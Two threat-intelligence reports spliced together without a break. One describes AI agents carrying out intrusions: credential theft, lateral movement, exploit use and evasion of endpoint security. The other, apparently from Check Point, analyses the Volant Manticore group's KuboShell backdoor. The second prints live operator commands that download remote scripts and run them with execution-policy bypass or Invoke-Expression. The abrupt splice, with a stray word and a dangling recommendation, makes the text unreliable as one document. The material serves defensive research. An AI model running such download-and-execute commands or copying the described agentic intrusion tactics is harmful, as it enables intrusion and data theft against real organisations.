An agentic AI attacker is an autonomous AI system — usually a large language model (LLM) with tool-calling capabilities — that independently plans, executes and adapts attack sequences without continuous human guidance.remote

Unlike chatbots that respond to individual prompts, agentic AI systems operate in a loop: they observe their environment, reason about what to do next, take action and then observe the results to inform their next step.

How Agentic Attackers Are Changing the Threat Landscape

The weaponization of agentic AI represents an increased threat to security for several reasons:

Speed and scale: An agentic AI attacker operates at machine speed. In the campaigns we observed, AI agents executed hundreds of unique commands within minutes.

Lowered barrier to entry: Attackers can simply provide high-level guidance while the AI agent automates intricate technical phases. This includes complex actions such as compiling kernel exploits, navigating cross-platform lateral movement and systematically compromising cloud infrastructure.

Adaptive reasoning: Unlike script-based attacks that fail when they encounter unexpected conditions, agentic AI attackers employ reasoning to try alternative approaches when failures occur. We observed agents attempting five different privilege escalation techniques in sequence when earlier ones failed, compiling custom exploit code on-target when pre-built binaries didn’t work.

Cross-domain fluency: A single agentic AI attacker can operate across Linux, Windows, various cloud platforms, web applications, databases and network infrastructures. This breadth of expertise would typically require a team of specialists.

New challenges in threat attribution: Because AI agents generate unique, dynamic payloads on the fly without distinct behavioral fingerprints, attributing attacks to specific threat actors is increasingly difficult.

The Agentic AI Attack Cycle

Our analysis of more than 10 campaigns observed between July and September 2026 indicates that the most successful intrusions consistently combined human oversight with AI agents in a unified operational model:

Human sets the objective: The human operator identifies a target and provides initial access — typically a web shell on a vulnerable web application. In some cases, the human operator executes the first assessment of the target.

AI agent takes over: The AI agent autonomously performs further reconnaissance, credential harvesting, privilege escalation and lateral movement.

AI agent reports back: The AI agent structures its findings using machine-readable output formatting and periodically checks in with orchestration APIs.

Human makes strategic decisions: The human operator reviews the AI agent’s findings and directs high-level strategy. This may include instructing the agent to target the payment system or establish persistence.

AI agent executes: The AI agent carries out the human’s strategic directives with tactical autonomy.

Figure 1 shows the attack lifecycle.

Common Characteristics of Agentic AI Attacks

A comparative analysis of AI-assisted campaigns that we observed revealed several defining operational markers. These characteristics are strong indicators of an agentic attacker rather than a human operator:

The speed of the attack

Use of section headers

Overly descriptive comments

Command Execution Rate

One of the most pronounced characteristics of an attack performed by an AI operator is its ability to rapidly execute a high volume of commands.

In one attack we investigated, the AI attacker was active for only 140 minutes across two days. In this brief period of time, the attacker progressed from initial access via web shell, to performing reconnaissance and enumerating the victim’s cloud environment, website and databases. Throughout the attack, the AI agent executed about 800 unique commands at an inhuman pace.

In another campaign conducted over a 12-day period, the attacker executed more than 8,000 unique commands.

To understand the difference in operational speed between human and AI operators, we checked the median inter-command gap between two phases of the observed attacks. In a subset of analyzed attacks, the first phase featured manual reconnaissance and connectivity checks by human operators, with a median inter-command gap of 23.9 seconds.

In the second phase of the attack, the operation was passed to an agentic AI attacker. Once an AI operator took command, the median inter-command gap dropped to 1.4 seconds. Figure 2 shows the median inter-command gap difference between the two phases.

Headers and Delimiters

In every campaign that we observed, AI operators used section headers in shell commands and scripts, such as ===[Title]===. These headers help AI parse the results of the executed commands faster. In human-operated attacks such headers rarely appear, and are usually only seen when an attacker uses a pre-coded script.

Figure 3 shows an example of multiple commands executed by an AI operator, with section headers that separate the output of the commands.

Chain of Thought Comments

A common indicator of agentic AI-generated code is using “reasoning comments” embedded within technical scripts. In more than half of the observed campaigns, we identified multiple scripts containing conversational, step-by-step reasoning notes. These notes explained the logic of the AI operator’s script execution, as Figure 4 shows.

Operational Trends of Agentic AI Attacks in the Wild

In addition to the behavioral fingerprints distinguishing AI operators from human attackers, our investigation revealed consistent operational trends. Despite targeting diverse organizations, the agentic AI attackers followed a similar playbook:

Moving across platforms

Relying heavily on web shells for initial foothold and persistent C2

Adapting strategy in real time

Demonstrating explicit awareness of deployed security products

The following sections detail the trends that we observed across the different campaigns that we investigated.

Multi-Platform Attacks

Many observed attacks began on Linux web servers, but quickly spread to other platforms. Each campaign aimed to expand as widely as possible across the targeted network, regardless of platform or technology. This is an example of how AI agents continue to lower the barrier of entry for less-experienced operators. While a human attacker might take years to master each operating system (OS), agentic AI can seamlessly move between them and even compromise cloud infrastructure.

Cloud Platform Abuse

Our investigation found agentic AI attackers misusing cloud services across three major cloud providers. We assess that the exploitation was adaptive — the agent discovered the cloud platform and pivoted to platform-specific techniques without any pre-configuration.

In one campaign targeting a US-based hospitality and gaming company, upon discovering an AWS EC2 instance role, the AI agent attempted to steal credentials via the Instance Metadata Service (IMDS). When IMDSv1 was blocked, the agent immediately adapted and switched to IMDSv2 token acquisition, succeeding after multiple iterative attempts.

Once authenticated, the AI agent enumerated 20 AWS services across eight regions, exfiltrating information about the victim’s buckets, email service and secret management. The ability to enumerate is a basic part of bucket functionality, but in this case it was misused for malicious purposes. Additionally, upon discovering S3 bucket names in the configuration files, the agent immediately targeted payment and financial data paths.

This targeted pivot suggests that the human operator instructed the agent to prioritize high-value financial assets. Cortex XDR detected the agentic AI attacker spawning multiple processes enumerating the victim’s payment resources, as Figure 5 shows.

We assess that a human operator instructed the AI agent only to collect information in preparation for a more aggressive future takeover, as no harmful actions were taken. We observed the AI agent testing its ability to write into production cloud environments, immediately deleting test files and examining the bucket’s policy and Access Control List (ACL) to see if the bucket was publicly accessible or had exploitable policies.

Multi-OS Compromise

The AI agents also demonstrated an ability to operate across multiple operating systems within a single attack chain. In one observed campaign, an AI agent initially compromised a Linux server via a PHP web shell, and was able to pivot to a separate Windows IIS server with stolen SMB credentials. The rate of the lateral movement was incredibly fast: Within two minutes of identifying the Windows IIS server, the agent began deploying ASPX web shells over SMB. Over the next 26 minutes it pushed webshells to more than 40 locations across the server, rotating between five different webshell variants and uploading custom web.config files to enable script execution.

Adaptive and Strategic Attacks

One of the features that makes agentic AI attackers more powerful than older models and automations is an agent’s ability to adapt its strategy based on what it discovers.

In one campaign, we observed the AI agent demonstrate a particularly adaptive strategy: After exploiting the initial victim, the agent autonomously identified and attacked the victim’s IT vendor and sister organizations.

After gaining an initial foothold on the server, the AI agent uncovered the credentials for the vendor’s self-managed GitLab instance on the victim’s compromised web server. Pivoting immediately, the agent probed the vendor’s site, mapped infrastructure via WHOIS and tried to brute force access to the vendor’s GitLab instance, attempting a supply-chain attack across the vendor’s client base.

During a brute-force attempt, the agent used real names of marketing team members. This targeting suggests that the AI agent may have performed additional open-source intelligence (OSINT) gathering to identify specific employees. No vulnerability in GitLab was exploited; the credentials were exposed through the compromised third-party web server.

When the AI agent read the server’s NGINX virtual-host configurations, it identified over a dozen related sister-company entities on the same internal network. It then systematically probed each entity:

Harvesting CSRF tokens from login portals

Attempting credential reuse with passwords stolen from the primary target

Launching four iterative SQL injection scripts against the parent company’s admin panel

The agentic attacker takeover flow is shown in Figure 6.

Beyond strategic thinking, agentic AI attackers can escalate and tailor their attacks rapidly based on new information. This adaptiveness includes:

Quickly creating custom payloads

Pivoting to new attack vectors

Reacting swiftly to tool and script failures

In another case, we observed an agentic AI attacker execute a port sweep using a script named scan.sh. Just 21 seconds after the port sweep, the agent ran a second script named scan2.sh. The second script contained tailored recon commands that matched the exact technologies discovered on each port by the first script. Figure 7 shows the content of both scripts.

Web Shell-Based Intrusions

Across all analyzed campaigns, initial network access was achieved by deploying web shells on internet-facing web servers. This trend reflects a preference among human operators for leveraging web shells when orchestrating agentic AI operations. Web shells provide a straightforward approach to establishing initial footholds at scale during opportunistic attacks.

As an alternative to a web shell, an attacker could establish a foothold on a victim’s machine using a reverse shell, a remote access Trojan (RAT) or remote monitoring and management (RMM) software. However, those methods typically require more operational effort and resources to create and maintain.

In some cases, we observed that instead of relying on compiled implants to send commands, the AI agents independently dropped and utilized web shells. This provided the agents with ongoing code execution and persistence.

Dynamic Command Encoding

Given the extensive use of web shells as an initial foothold, secondary payloads were routinely obfuscated using Base64 encoding — a standard technique in web shell-based intrusions. Any attacker piping multi-line code through a web shell’s sh -c interface will encode it, to avoid breaking the code on shell metacharacters, quotes and special symbols. What distinguishes agentic AI attackers from human operators is not the encoding itself, but the volume, uniqueness and variety of encoded payloads they produce.

In a typical human-operated web shell intrusion, an attacker might deliver a handful of pre-written tools via Base64, which are reusable and often appear across multiple victims with identical hashes. However, in the agentic campaigns we investigated, the pattern was different: AI agents delivered 40-100 unique Base64-encoded payloads in a single attack session, each one tailored for the specific target’s assets. No two payloads were identical across victims and no payload matched any known tool signature.

Evasion Techniques and Security Awareness

While the high volume and fast rate of command execution make agentic AI attackers “noisy,” they demonstrated explicit awareness of deployed security products. Apart from attempting to evade sensors, agentic attackers are now actively probing their configuration, understanding the enforcement boundaries of detection tools and attempting to debug why a security tool blocked an action. This level of security-aware behavior was observed across multiple campaigns and represents a significant escalation from automated attacks that we have observed in the past.

EDR Path Exclusion

In one observed campaign, the AI agent deliberately excluded endpoint detection and response (EDR) directories from file discovery commands. The agent executed the same find command on six compromised endpoints, excluding three different security vendors, as seen in Figure 8.

Notably, the same agent also ran a separate security tool enumeration command, checking for the presence of 16 different security scanners (nmap, nessus, openvas, nikto, masscan, nuclei, lynis and others), mapping the defensive landscape before proceeding with its attack.

Direct EDR Reconnaissance

Our investigation revealed multiple cases where AI agents transitioned from simple evasion to active reconnaissance of installed security stacks. These agents methodically interrogated endpoint monitoring solutions to map their operational boundaries, as demonstrated in the following observed behaviors:

The AI agent attempted to enumerate and exfiltrate the endpoint’s security product local directory, specifically hunting for sensitive configuration data and stored credentials.

In a display of iterative debugging, the agent applied strace to the Microsoft Defender for Endpoint process (wdavdaemon), analyzing kernel-level system calls to reverse-engineer how the daemon monitors environment activity.

The Absence of Custom Tools and Malware

One of the most interesting outcomes from our campaign analysis was what we didn’t find. Although in the course of our investigation we extracted hundreds of unique script payloads, we did not recover a single compiled backdoor, custom C2 framework, DLL implant or shellcode loader.

In most cases, the AI agent’s entire custom arsenal consisted of relatively simple, single-use scripts like PHP web shells, PowerShell WMI backdoors or Python credential harvesters. This is a departure from the usual tooling profile of advanced attackers, who typically invest in compiled, persistent implants designed for long-term access.

Unlike these attackers, the observed agentic AI attackers generated purpose-built scripts on the fly, tailored to whatever they discovered at the same moment. Thus, instead of a single “one-size-fits-all” implant, the attacker’s progress within the victim’s network was achieved through smaller, single-step scripts. Cortex XDR detection demonstrates how the agentic AI attacker could generate and deploy different script types under the same process chain, as Figure 9 shows.

Reliance on Open-Source Tools and Exploits

Although we observed many cases of agentic AI attackers generating custom code on the fly, campaigns routinely incorporated existing, open-source tools before resorting to custom coding.

One recurring example is the Copy Fail exploit (CVE-2026-31431), a Linux kernel vulnerability that appeared across several organizations targeted in the observed campaigns. In three separate cases, the AI agent attempted to directly download the exploit from external sources — either via the exploit’s official GitHub repo, or from the exploit’s website.

In a different attack sequence, the AI agent first uploaded a pre-compiled PwnKit binary and tried multiple invocation methods. When that binary failed, the agent fetched a pre-compiled CVE-2024-1086 privilege escalation exploit. Only after exhausting both public binaries did the AI agent begin writing custom C source code on the target, iterating through compilers and linkers. When the compilation attempt also failed, the agent tried to rewrite the exploit logic in Python.

In another case that combined open-source tools with custom payloads, the AI agent followed a similar, but more layered approach. After failing to execute a precompiled CopyFail for local privilege escalation, it compiled the PwnKit exploit from source directly on the target. Subsequently, for network reconnaissance, the agent wrote a custom C network probe tool (charon_lite.c), and built custom Python spray scripts on top of it using the open-source paramiko library.

Operator Fingerprints in AI Agent-Enhanced Attacks

With the rise of AI agent-enhanced operations, fingerprinting operations with static payload signatures and behavioral tracking is becoming more difficult. We suggest alternative methods of fingerprinting agentic AI campaigns, relying on human intention, operational mishaps and infrastructure correlation.

During our research, we did not encounter behavioral markers that link agentic activity to specific LLM models or orchestration frameworks. While attack patterns like Base64 payload delivery and systematic reconnaissance commands are consistent, their implementations are too diverse to provide a unique behavioral fingerprint. Since AI-generated code is custom built for each target, signature-based attribution is largely ineffective.

However, it was clear that a human operator was behind these agentic infrastructures. A human decides which target to attack, when to launch the operation and which assets to compromise. Beyond operational intent, the human operators and their AI agents continue to leave behind key artifacts that provide crucial attribution leads:

Infrastructure

Hard-coded C2 addresses in payloads: In some cases, AI agents embed attacker-controlled IP addresses and network ranges directly into generated malware payloads and web shells. In one campaign, the C2 server 204.194.54[.]240 appeared in both PowerShell download cradles and cURL probes.

Agent orchestration infrastructure: Pivoting on the hard-coded 204.194.54[.]240 C2 server revealed that it was also hosting an instance of CyberStrikeAI, an AI-native offensive security platform. The presence of CyberStrikeAI allows us to pinpoint the use of a specific orchestration platform. This is the kind of infrastructure-level attribution that behavioral analysis alone cannot provide.

Cross-campaign infrastructure overlap: The malicious use of 204.194.54[.]240 is not an isolated incident. Recent threat research by ReliaQuest documented the same IP acting as a staging and reconnaissance node in a separate agent-driven attack. Their investigation also noted the presence of the CyberStrikeAI login page and open directories hosting privilege escalation tools on this address, corroborating the use of this specific infrastructure across multiple agentic campaigns.

Toolset

Accidental file paths from the attacker’s environment: In one campaign, we observed the accidental pasting of a local file path: /home/kali/exploitmasteryai/targets/warranty/shell5.php. The exploitmasteryai path fragment is the only concrete indicator of the AI attack framework’s identity across the entire campaign, and it was exposed purely through an operational security failure.

Linguistic artifacts leakage in code comments: Attackers interact with AI agents in a variety of languages, which results in code comments generated in those languages. Defenders can treat these as artifacts like native language comments in human-operated campaigns. In one example we encountered, the attackers used two identical versions of a WMI backdoor — one that contained comments in Chinese, and a newer version that was specified to be English only. Figure 10 shows both versions of the WMI backdoor.

Conclusion

Agentic AI attacks are no longer a theoretical concern, but an active threat targeting a broad range of industries. The campaigns we observed were aimed at government, logistics, manufacturing, hospitality, education and agriculture sectors. All of the attacks used the same method: A human operator points an AI agent at a vulnerable web application, and the agent takes it from there.

What we observed is not a new class of attack sophistication. The techniques themselves are the same ones that a skilled human attacker would employ. The agents follow well-established attack flows, rely on known CVEs and use the same open-source tools that human operators have used for years.

Where agentic AI attacks fundamentally differ is in their speed, volume and their ability to quickly and efficiently adapt to different types of platforms and operating systems. These feats allow agentic attackers to fully compromise a network in mere hours, where even an experienced attacker would take days or weeks.

However, in the attacks we witnessed, agentic attackers left behind unmistakable fingerprints that a human operator is unlikely to produce. These indications included chain-of-thought comments and specific content delimiters. Hunting for these signs could help defenders recognize and prevent this threat.

Ultimately, defending against agentic AI attacks requires AI-powered defenses, as these types of attacks are diverse, and require a solution that can identify patterns regardless of the specific tools, techniques or platforms involved.

Enforce multi-factor authentication

Key Points

Check Point Research identified Volant Manticore, a previously undocumented Iranian threat group linked to Iran’s Ministry of Intelligence and Security (MOIS). Based on our observations, we believe this is the first Iranian group to designate Cyprus as a primary espionage target, focusing on telecommunications companies, airlines, and critical infrastructure.

The group uses KuboShell, a new backdoor that utilizes IPFS for command-and-control (C2) functions, to deploy the Homa Framework, a post-compromise framework built on a reimplementation of MuddyWater’s MuddyC2Go client. Alongside custom malware, Volant Manticore delivers RMM tools and runs credential-harvesting campaigns.

Further analysis shed light on the operators’ internal setup, including development, testing, and operational environments, both on-premise and in the cloud. We observed the group testing their tooling against antivirus products before deployment, as well as using Fortinet SSL VPN clients which suggests access to the victims’ networks via VPN.

While we identified multiple links to MuddyWater, we assess that Volant Manticore likely consists of former MuddyWater operators who branched off from the group and currently operate as a separate threat cluster.

Volant Manticore’s targeting priorities appear responsive to regional geopolitical developments. A recent shift toward Saudi Arabian targets, including the healthcare sector, may reflect the escalating tensions between Saudi Arabia and the Iranian-backed Houthis.

Introduction

Check Point Research is tracking a previously undocumented Iran-nexus threat group who we named Volant Manticore. What started in July 2026 as a single backdoor delivered to a Cyprus-based airline through a fake CV has since expanded into a broader cluster of activity that we traced back to September 2025.

MuddyWater is an Iranian espionage group linked to the Ministry of Intelligence and Security (MOIS), focusing primarily on espionage and active since at least 2017. Volant Manticore shares tooling and tradecraft with MuddyWater, but their narrow regional focus, custom implants, and distinct TTPs (Tactics, Techniques, and Procedures) set it apart.

Cyprus is at the center of Volant Manticore’s operations. The island’s deepening defensive and energy ties with Israel and Greece, and its role as a hub for Western military operations in the region, make it a natural target for Iranian intelligence collection. Cyprus was among the countries where we observed a rise in Iran-nexus targeting of IP cameras starting February 28, 2026, activity that may precede military strikes as well as support post-battle damage assessment. The group’s focus on the island’s telecommunications companies and airlines is consistent with Iran’s history of operational activity against individuals in Cyprus.

In September 2026, coinciding with escalating hostilities between Saudi Arabia and the Iranian-backed Houthis, we observed Volant Manticore abruptly shifting their attention to Saudi Arabia and targeting healthcare organizations. This fits the MOIS’s track record of targeting hospitals and healthcare providers through cyber operations during military conflicts, in some cases attempting to disrupt their operations.

In this report, we analyze the KuboShell backdoor and the Homa Framework, map Volant Manticore’s wider infrastructure, and analyze an earlier campaign against a likely Cypriot government target. We also cover the group’s recent turn toward Saudi Arabia and present evidence for our attribution.

Figure 1 – Volant Manticore activity timeline.

Delivery Method: Meet Athena Marinou

Our investigation started when we identified on Virus Total a fake CV belonging to “Athena Marinou”, an AI-generated travel and tourism professional based in Cyprus. The file invites the reader to download the full CV from a legitimate jobs and recruitment website, but the hyperlink behind that text actually points to an archive hosted at Catbox, which delivers the KuboShell Backdoor to the victim’s system. We assess this phishing attempt was aimed at a Cyprus-based airline whose business centers on flights between Cyprus and Israel.

Figure 2 – The fake CV used as a lure.

In late September this year, Volant Manticore launched a phishing campaign against Saudi targets, delivering KuboShell through an archive named AI_Healthcare_Seminar.zip. Similar to the initial sample we identified, this variant also masqueraded as PDF-related software.

We also identified a related archive, Ai_Healthcare_Seminar_Online.zip, which we assess targeted the same organization. Instead of KuboShell, it contains an N-able RMM executable. The email account associated with the sample belongs to a private hospital in Saudi Arabia, and was likely compromised using leaked credentials. Together with the different healthcare-themed lure names we observed, this suggests Volant Manticore specifically targeted the Saudi healthcare sector.

KuboShell – IPFS as a Command-and-Control Channel

KuboShell is a 64-bit Windows backdoor that uses the InterPlanetary File System (IPFS) for command-and-control (C2) communication. IPFS is a peer-to-peer file-sharing network that identifies each file by its content hash instead of its location. Because files remain available only while some node stores(“pins”) them, KuboShell relies on Pinata, a commercial pinning service that provides an API for uploading and retrieving files on IPFS. Kubo, referenced in the backdoor’s PDB path, is the original implementation of IPFS.

On startup, KuboShell checks whether it has administrator privileges. If not, it tries to relaunch itself with higher privileges, which triggers a User Account Control (UAC) prompt.

KuboShell retrieves the MAC address of the machine’s first network adapter and uses it as a unique identifier for each victim. It then registers the host by uploading a file containing hi, saved to C:\Users\Public\<MAC>.log, using a hard-coded Pinata access token.

After it’s registered, KuboShell checks Pinata for a command file named <MAC>.txt. If this file exists, KuboShell looks up the file’s IPFS identifier and downloads its contents through Pinata’s public gateway.

The downloaded text is passed to PowerShell in a hidden window. After execution completes, KuboShell attempts to upload C:\Users\Public\<MAC>re.txt, where the command is expected to write its results. KuboShell does not capture the output itself, so results are returned only if the received command writes them to that file. KuboShell then checks for a new command every 60 seconds.

Whacking the Piñata

We analyzed the historical commands issued by the operator and the command output across a time period spanning from May to October 2026, including operator testing conducted during the two months before the first observed phishing attempt.

Based on the operator commands, KuboShell appears to serve as an initial foothold for executing basic reconnaissance commands, particularly quser, whoami, and ipconfig, before downloading and executing a more capable backdoor through a multi-stage PowerShell and JavaScript execution chain. KuboShell therefore appears to function as a “guardrail”, allowing the operators to assess the compromised environment before deploying the final payload, consistent with phishing-based initial access.

In addition to reconnaissance and commands used to retrieve the next stage, the command history includes:

list payload persist Get-Variable route print net group "domain admins" /domain nslookup -q=srv _kerberos._tcp ping 10.40.0.174 -n 2 -a netstat -nat Invoke-WebRequest -Uri 'hxxps://remote.medochomie[.]com/api/ClientDownloads/WindowsInstaller/0f3db892-22d4-4479-a7ec-e54a375bd19c' -OutFile "${env:TEMP}\Install-Remotely.ps1" -UseBasicParsing; Start-Process -FilePath 'powershell.exe' -ArgumentList ("-executionpolicy", "bypass", "-f", "${env:TEMP}\Install-Remotely.ps1") -Verb RunAs;

Right Commands, Wrong Console

The operators sent list, persist, and payload commands to KuboShell, though none of them is a valid PowerShell command. These apparent “mistakes” suggest the operators entered built-in framework commands into the wrong console, which is consistent with the theory that the operators used a modular framework layered on top of the relatively simple JavaScript backdoor that acts as the final stage of this infection chain. As we discuss later in this section, the JavaScript backdoor exhibits links to MuddyWater tooling. Notably, all three commands sent by the operators are known commands in MuddyWater’s dedicated C2 frameworks, such as PhonyC2. This further supports the idea that the backdoor functions as the core module executor within a broader framework – which Check Point Research tracks as the Homa Framework.

Post-Compromise Payloads – The Homa Framework

From the operator commands, we were able to identify the next-stage payloads. We call this multi-stage post-compromise framework the Homa Framework.

Figure 3 – KuboShell infection chain and the Homa Framework stages.

Stage 1 – PowerShell Stager

The first stage is a simple PowerShell command that requests a payload from a hard-coded IP address, 185.205.187[.]109:8000, using a unique URI path assigned to each new client. It then reads the response and executes it in memory.

$uri ="http://185.205.187[.]109:8000/{UID}";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop; Invoke-Expression $response.Content

To bypass static analysis and evade signature-based detection, the operators appear to have experimented with different techniques to hide command execution, such as extracting character slices from system paths or default PowerShell preference variables like SpecialFolders[‘AllUsersStartUp’]and $PSSessionConfigurationName, to dynamically build execution triggers such as iex.
